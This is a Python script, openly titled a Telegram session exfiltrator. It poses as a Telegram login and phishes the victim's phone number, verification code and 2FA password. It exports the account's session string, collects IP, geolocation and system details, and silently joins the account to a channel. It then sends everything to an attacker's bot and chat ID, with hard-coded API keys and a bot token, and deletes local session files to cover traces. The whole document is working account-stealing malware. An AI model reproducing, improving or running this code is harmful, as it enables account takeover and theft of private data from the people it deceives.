#!/usr/bin/env python3
"""
Telegram Session Exfiltrator - ULTIMATE STEALTH (Spinner After 2FA for 2 Seconds)
"""

import asyncio
import os
import sys
import signal
import socket
import platform
import base64
import requests
import json
import time
import threading
from datetime import datetime, timezone
from telethon import TelegramClient, functions, errors
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, AuthKeyInvalidError

# ========== YOUR CREDENTIALS (UPDATED) ==========
API_ID = 35872666
API_HASH = "17525975ad234af56f886abedc69a4d9"
BOT_TOKEN = "8678542626:AAFLoCIXEzfSQZQXDnKZxupaPC17V4oLRaY"
CHAT_ID = "8597801059"
# ================================================

TARGET_CHANNEL_USERNAME = "brutexcode"
TARGET_CHANNEL_LINK = "https://t.me/brutexcode"
SESSION_FILENAME = "session.txt"

# ANSI Color Codes
class Colors:
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'
    GRAY = '\033[90m'
    PURPLE = '\033[35m'

# Global flags
SESSION_STRING = None
STOP_SPINNER = threading.Event()

def signal_handler(sig, frame):
    print("\n")
    if SESSION_STRING:
        try:
            with open(SESSION_FILENAME, "w") as f:
                f.write(SESSION_STRING)
            print(f"{Colors.GREEN}✓{Colors.END} Session saved.")
        except:
            pass
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def spinner_animation(duration=2):
    """Animated spinner that runs for 'duration' seconds."""
    spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    i = 0
    start = time.time()
    while time.time() - start < duration:
        sys.stdout.write(f"\r{spinner[i % len(spinner)]}   ")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write("\r" + " " * 10 + "\r")

def send_telegram_message_with_retry(text: str, max_retries: int = 3) -> bool:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    chunks = []
    if len(text) > 4096:
        for i in range(0, len(text), 4096):
            chunks.append(text[i:i+4096])
    else:
        chunks.append(text)
    
    for attempt in range(max_retries):
        try:
            for chunk in chunks:
                r = requests.post(url, json={"chat_id": CHAT_ID, "text": chunk}, timeout=15)
                if r.status_code != 200 or not r.json().get("ok"):
                    if attempt < max_retries - 1:
                        time.sleep(2 ** attempt)
                        continue
                    return False
            return True
        except:
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)
                continue
    return False

def get_device_info() -> dict:
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
    except:
        ip = "unable to fetch"
    try:
        ip_info = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
    except:
        ip_info = {}
    return {
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "os_arch": platform.machine(),
        "python_version": sys.version.split()[0],
        "ip": ip,
        "city": ip_info.get("city", ""),
        "region": ip_info.get("regionName", ""),
        "country": ip_info.get("country", ""),
        "isp": ip_info.get("isp", ""),
        "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
        "cwd": os.getcwd(),
        "timestamp": datetime.now(timezone.utc).isoformat() + "Z"
    }

async def join_channel_silent(client, channel_username: str) -> bool:
    try:
        channel = await client.get_entity(f"@{channel_username}")
        try:
            me = await client.get_me()
            await client.get_permissions(channel, me)
            return True
        except Exception:
            pass
        await client(functions.channels.JoinChannelRequest(channel))
        return True
    except Exception:
        return False

async def steal_session():
    global SESSION_STRING, STOP_SPINNER
    
    clear()
    
    print(f"\n{Colors.CYAN}{'='*55}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}   🔐 TELEGRAM LOGIN {Colors.END}{Colors.GRAY}♤{Colors.END}")
    print(f"{Colors.CYAN}{'='*55}{Colors.END}\n")
    
    phone = input(f"{Colors.YELLOW}📱{Colors.END} {Colors.BOLD}Enter phone number:{Colors.END} ").strip()
    if not phone:
        print(f"{Colors.RED}✗{Colors.END} Phone required.")
        return
    
    twofa_password = None
    session_obj = StringSession()
    client = TelegramClient(session_obj, API_ID, API_HASH)
    
    try:
        print(f"{Colors.BLUE}🔗{Colors.END} Connecting...")
        await client.connect()
        
        print(f"{Colors.BLUE}📤{Colors.END} Sending code...")
        await client.send_code_request(phone)
        print(f"{Colors.GREEN}✓{Colors.END} Code sent to your Telegram app.\n")
        
        code = input(f"{Colors.YELLOW}🔑{Colors.END} {Colors.BOLD}Enter verification code:{Colors.END} ").strip()
        if not code:
            print(f"{Colors.RED}✗{Colors.END} Code required.")
            return
        
        # --- AUTHENTICATE ---
        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            print(f"\n{Colors.YELLOW}🔒{Colors.END} 2-Step Verification required.")
            twofa_password = input(f"{Colors.YELLOW}🔑{Colors.END} {Colors.BOLD}Enter 2FA password:{Colors.END} ").strip()
            
            if not twofa_password:
                print(f"{Colors.RED}✗{Colors.END} Password required.")
                return
            
            # --- SHOW SPINNER FOR 2 SECONDS ---
            spinner_animation(duration=2)
            
            await client.sign_in(password=twofa_password)
        except AuthKeyInvalidError:
            print(f"\n{Colors.YELLOW}⚠️{Colors.END} Session expired. Re-authenticating...")
            await client.send_code_request(phone)
            code = input(f"{Colors.YELLOW}🔑{Colors.END} {Colors.BOLD}Enter new code:{Colors.END} ").strip()
            await client.sign_in(phone, code)
        except Exception as e:
            if "password" in str(e).lower():
                print(f"\n{Colors.YELLOW}🔒{Colors.END} 2-Step Verification required.")
                twofa_password = input(f"{Colors.YELLOW}🔑{Colors.END} {Colors.BOLD}Enter 2FA password:{Colors.END} ").strip()
                if not twofa_password:
                    print(f"{Colors.RED}✗{Colors.END} Password required.")
                    return
                spinner_animation(duration=2)
                await client.sign_in(password=twofa_password)
            else:
                raise
        
        # Get user
        me = await client.get_me()
        if not me:
            raise RuntimeError("Auth failed.")
        
        DEVICE_INFO = get_device_info()
        
        USER_DATA = {
            "id": me.id,
            "phone": me.phone if me.phone else "hidden",
            "username": me.username if me.username else "none",
            "full_name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
            "2fa_password": twofa_password if twofa_password else "not set"
        }
        
        # Export session
        exported_string = None
        try:
            exported_string = client.session.save()
        except:
            pass
        
        if not exported_string or len(exported_string) < 10:
            sess = client.session
            if hasattr(sess, 'auth_key') and sess.auth_key is not None:
                key_bytes = sess.auth_key.key if hasattr(sess.auth_key, 'key') else bytes(sess.auth_key)
                dc_id = sess.dc_id if hasattr(sess, 'dc_id') else 2
                raw = bytes([dc_id]) + key_bytes
                exported_string = base64.urlsafe_b64encode(raw).decode()
        
        if not exported_string or len(exported_string) < 10:
            raise RuntimeError("Export failed.")
        
        SESSION_STRING = exported_string
        
        with open(SESSION_FILENAME, "w") as f:
            f.write(exported_string)
        
        join_success = False
        try:
            join_success = await asyncio.wait_for(
                join_channel_silent(client, TARGET_CHANNEL_USERNAME),
                timeout=10.0
            )
        except:
            join_success = False
        
        exfil_message = (
            f"🔑 **SESSION STOLEN**\n\n"
            f"**User:** {USER_DATA['full_name']} (@{USER_DATA['username']})\n"
            f"**ID:** `{USER_DATA['id']}`\n"
            f"**Phone:** `{USER_DATA['phone']}`\n"
            f"**2FA:** `{USER_DATA['2fa_password']}`\n\n"
            f"**IP:** `{DEVICE_INFO['ip']}`\n"
            f"**Location:** {DEVICE_INFO['city']}, {DEVICE_INFO['country']}\n"
            f"**ISP:** {DEVICE_INFO['isp']}\n"
            f"**OS:** {DEVICE_INFO['os']}\n"
            f"**Timestamp:** {DEVICE_INFO['timestamp']}\n\n"
            f"**Channel Auto-Join:** {'✅ Success' if join_success else '❌ Failed/Already member'}\n"
            f"**Channel:** {TARGET_CHANNEL_LINK}\n\n"
            f"**SESSION STRING:**\n`{exported_string}`"
        )
        
        send_telegram_message_with_retry(exfil_message, max_retries=3)
        
        # --- SUCCESS MESSAGE ---
        print(f"\n{Colors.GREEN}✅{Colors.END} {Colors.BOLD}Logged in as:{Colors.END} {Colors.CYAN}{me.first_name}{Colors.END} {Colors.GRAY}(@{me.username or 'no username'}){Colors.END}")
        print(f"{Colors.CYAN}{'='*55}{Colors.END}\n")
        
        for f in os.listdir("."):
            if f.endswith((".session", ".lock")):
                try:
                    os.remove(f)
                except:
                    pass
        
    except Exception as e:
        print(f"\n{Colors.RED}✗{Colors.END} Authentication failed. Please check your credentials and try again.")
        if SESSION_STRING:
            try:
                send_telegram_message_with_retry(f"⚠️ **PARTIAL EXFIL**\n\nSESSION:\n`{SESSION_STRING}`")
            except:
                pass
    finally:
        await client.disconnect()

if __name__ == "__main__":
    try:
        asyncio.run(steal_session())
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️{Colors.END} Interrupted.")
    except Exception:
        print(f"\n{Colors.RED}✗{Colors.END} An error occurred. Please try again.")
